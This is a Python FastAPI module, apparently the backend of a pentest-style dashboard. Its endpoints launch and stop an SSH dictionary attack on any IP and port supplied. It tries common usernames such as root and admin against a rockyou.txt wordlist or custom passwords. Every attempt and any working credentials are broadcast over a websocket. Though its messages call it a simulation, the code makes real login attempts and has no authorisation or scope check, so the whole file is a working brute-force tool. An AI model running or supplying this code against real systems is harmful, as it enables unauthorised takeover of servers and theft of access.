from fastapi import APIRouter, HTTPException, BackgroundTasks
import paramiko
import os
import socket
import asyncio
from pydantic import BaseModel
from typing import List, Optional
from app.websocket.manager import manager

router = APIRouter()

# 🟢 DEFAULT WORDLIST PATH (Using workspace rockyou.txt as primary fallback source)
DEFAULT_USER_LIST = ["admin", "root", "user", "support"]
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PASS_LIST_PATH = os.path.join(BASE_DIR, "..", "..", "..", "rockyou.txt")

class AttackConfig(BaseModel):
    ip: str
    port: int
    use_custom: bool = False
    custom_passwords: List[str] = []

def load_wordlist(path: str) -> List[str]:
    """Helper to read passwords from a local default file."""
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return ["123456", "password", "admin123", "root123"] # Safety Fallback

active_bruteforces = set()

async def perform_attack(config: AttackConfig, passwords: List[str]):
    """Background task to run the bruteforce attack without blocking the server."""
    await manager.broadcast({
        "type": "execution_step",
        "command": f"Initializing Simulation Kernel (Port: {config.port})",
        "progress": 5
    })

    total_attempts = len(DEFAULT_USER_LIST) * len(passwords)
    current_attempt = 0

    for user in DEFAULT_USER_LIST:
        for pwd in passwords:
            if config.ip not in active_bruteforces:
                await manager.broadcast({
                    "type": "execution_step",
                    "command": "⚠️ KERNEL HALTED: User aborted the attack simulation.",
                    "progress": 100
                })
                return

            current_attempt += 1
            progress_pct = int((current_attempt / total_attempts) * 100)
            
            try:
                # Initialize SSH client
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Broadcast the Kernel execution step
                await manager.broadcast({
                    "type": "execution_step",
                    "command": f"SSH_CONNECT → {config.ip}:{config.port} [AUTH_MODE: PASSWORD]",
                    "progress": progress_pct
                })

                # Attempt connection in a separate thread so we don't block the FastAPI event loop
                await asyncio.to_thread(
                    client.connect, 
                    config.ip, 
                    port=config.port, 
                    username=user, 
                    password=pwd, 
                    timeout=3
                )
                
                # SUCCESS: Broadcast and terminate loop
                match = {"user": user, "pass": pwd, "status": "SUCCESS"}
                await manager.broadcast({
                    "type": "bruteforce_success",
                    "ip": config.ip,
                    "creds": match
                })
                client.close()
                if config.ip in active_bruteforces:
                    active_bruteforces.remove(config.ip)
                return
                
            except paramiko.AuthenticationException:
                # Log specific attempt to the Live Console
                await manager.broadcast({
                    "type": "bruteforce_attempt",
                    "ip": config.ip,
                    "port": config.port,
                    "user": user,
                    "pass": pwd,
                    "status": "FAILED"
                })
            except (paramiko.SSHException, socket.error):
                # FIREWALL INTELLIGENCE: Detect if target is blocking attempts
                await manager.broadcast({
                    "type": "execution_step",
                    "command": f"⚠️ ALERT: {config.ip} is actively blocking scan packets. Connection Refused.",
                    "progress": progress_pct
                })
                if config.ip in active_bruteforces:
                    active_bruteforces.remove(config.ip)
                return
            except Exception as e:
                continue
            finally:
                await asyncio.sleep(0.3) # Non-blocking async sleep

    if config.ip in active_bruteforces:
        active_bruteforces.remove(config.ip)

    await manager.broadcast({
        "type": "execution_step",
        "command": f"⚠️ KERNEL HALTED: Dictionary exhausted with no valid credentials.",
        "progress": 100
    })

class StopConfig(BaseModel):
    ip: str

@router.post("/stop-ssh-burst")
async def stop_ssh_bruteforce(config: StopConfig):
    if config.ip in active_bruteforces:
        active_bruteforces.remove(config.ip)
        return {"status": "success", "message": "Brute force simulation stopped"}
    return {"status": "error", "message": "No active SSH brute force found for target"}

@router.post("/start-ssh-burst")
async def start_ssh_bruteforce(config: AttackConfig, background_tasks: BackgroundTasks):
    """
    Initiates an asynchronous SSH dictionary attack.
    Uses FastAPI BackgroundTasks to immediately return a 200 OK and prevent CORS timeouts.
    """
    # 1. Determine Wordlist Data
    if config.use_custom and config.custom_passwords:
        passwords = config.custom_passwords
        await manager.broadcast({
            "type": "execution_step",
            "command": f"Loaded CUSTOM payload containing {len(passwords)} keys.",
            "progress": 2
        })
    else:
        # Verify File Existence for the Console
        if not os.path.exists(DEFAULT_PASS_LIST_PATH):
            await manager.broadcast({
                "type": "execution_step",
                "command": f"⚠️ CRITICAL: Default wordlist missing at {DEFAULT_PASS_LIST_PATH}. Using internal fallback.",
                "progress": 0
            })
            passwords = ["123456", "password", "admin123"] # Fallback
        else:
            passwords = load_wordlist(DEFAULT_PASS_LIST_PATH)
            await manager.broadcast({
                "type": "execution_step",
                "command": f"Loaded DEFAULT wordlist payload.",
                "progress": 2
            })

    # 2. Launch the kernel in the background
    active_bruteforces.add(config.ip)
    background_tasks.add_task(perform_attack, config, passwords)
    
    # 3. Immediately return success to the frontend to close the HTTP connection
    return {"status": "started", "message": "Kernel deployed in background"}